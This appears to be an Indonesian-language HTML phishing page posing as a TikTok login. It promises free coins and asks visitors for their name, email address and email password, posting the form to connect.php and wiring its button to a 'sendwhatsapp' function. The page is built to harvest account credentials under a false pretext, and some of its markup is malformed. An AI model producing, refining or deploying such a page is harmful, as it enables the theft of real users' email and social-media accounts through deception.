<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
      *{
         background: black;
         color: white;
      }
      .tt{
      width: 700px;
      position: fixed;
    left: 25%;
      }
      .center{
      text-align: center;
      position: relative;
      font-size: 70px;
      }
    form{
      margin: 15px 5px;
      width: 500px;
      font-size: 60px;
      left: 30%;
      text-align: center;
      position: relative;
      top: 800px;
    }
    form h1{
      text-align: center;
    }
    form label{
      display: block;
      margin-bottom: 5px;
    }
    form input, form textarea{
      width: 100%;
      padding: 5px;
      height: 70px;
      font-size: 50px;
      margin-bottom: 10px;
      box-sizing: border-box;
      resize: vertical;
    }
    form button{
      background: #4CAF50;
      color: white;
      padding: 10px 15px;
      font-size: 50px;
      margin-top: 5px;
      border: 2px blue;
      cursor: pointer;
      width: 100%;
    }
    form button:hover{
      background: green;
    }
    h1{
       font-size: 60px;
       position: relative;
       text-align: center;
       top: 800px;
    }
    
      </style>
   </head>
   <body>
   <img src="ddd.jpg" class="tt">
   <div class="center">
      <b>Masuk Dengan Akun Tiktok</b>
   </div>
         <h1>KIRIM AKUN ANDA AGAR BISA MENDAPATKAN COIN</h1>
       <form method="post" action="connect.php" method="post">
      <label for="">Name</label>
      <input type="text" class="name">

      <label for="">Email</label>
      <input type="email" class="esail" name"email">

      <label for="">password_email</label>
      <input type="text" class="password_email" name"password_email">
      <button type="button" onclick="sendwhatsapp();">Get Coin</button>
    </form>
   </body>
</html>